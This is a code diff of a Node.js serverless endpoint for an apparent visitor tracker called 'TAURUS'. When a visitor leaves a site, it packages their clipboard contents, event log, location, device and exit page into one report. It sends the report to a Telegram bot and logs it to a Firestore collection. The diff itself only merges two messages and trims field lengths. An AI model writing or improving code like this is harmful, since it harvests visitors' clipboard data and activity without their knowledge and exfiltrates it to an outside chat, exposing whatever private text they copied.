@@ -74,8 +74,11 @@ module.exports = async (req, res) => {
     try {
         const brandingLink = `<a href="https://omeryigitler.com/assets/logo.png">&#x200b;</a>`;
 
-        // 1. SUMMARY MESSAGE
-        const summaryMsg = brandingLink + panel({
+        const compactClipboard = escapeHtml(clipboard || 'None').substring(0, 900);
+        const compactEventLog = escapeHtml(eventLog || 'No events recorded').substring(0, 1400);
+
+        // Single Telegram message: one exit event must produce one notification.
+        const telegramMsg = brandingLink + panel({
             title: 'TAURUS // EXIT REPORT',
             subtitle: 'Visitor session closed',
             rows: [
@@ -84,37 +87,18 @@ module.exports = async (req, res) => {
                 row('📍', 'Exit Page', exitPage, { code: true }),
                 row('🌍', 'Location', location || 'Unknown'),
                 row('💻', 'Device', deviceInfo || 'Unknown'),
-            ],
-        });
-
-        // 2. PAYLOAD MESSAGE (SECOND MESSAGE)
-        const payloadMsg = panel({
-            title: 'TAURUS // SESSION DETAILS',
-            subtitle: 'Captured interaction data',
-            rows: [
-                `📋 <b>Clipboard</b>\n<pre>${escapeHtml(clipboard || 'None')}</pre>`,
-                `📝 <b>Event Log</b>\n<pre>${escapeHtml(eventLog || 'No events recorded')}</pre>`,
+                `📋 <b>Clipboard</b>\n<pre>${compactClipboard}</pre>`,
+                `📝 <b>Event Log</b>\n<pre>${compactEventLog}</pre>`,
             ],
         });
 
         let telegramSent = false;
         try {
-            // Send Summary
             await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
                 chat_id: finalChatId,
-                text: summaryMsg,
+                text: telegramMsg.substring(0, 4090),
                 parse_mode: 'HTML',
                 disable_web_page_preview: false
-            });
-
-            // Add small delay to prevent Telegram rate limiting
-            await new Promise(resolve => setTimeout(resolve, 300));
-
-            // Send Payload (The "Second Message")
-            await axios.post(`https://api.telegram.org/bot${finalBotToken}/sendMessage`, {
-                chat_id: finalChatId,
-                text: payloadMsg.substring(0, 4090),
-                parse_mode: 'HTML'
             });
 
             telegramSent = true;
@@ -126,7 +110,7 @@ module.exports = async (req, res) => {
         await db.collection('system_reports').add({
             name: "System Report",
             email: "tracker@taurus.sys",
-            message: (summaryMsg + "\n" + payloadMsg).replace(/<[^>]*>/g, '').substring(0, 5000),
+            message: telegramMsg.replace(/<[^>]*>/g, '').substring(0, 5000),
             timestamp: admin.firestore.FieldValue.serverTimestamp(),
             status: 'logged',
             type: 'report',
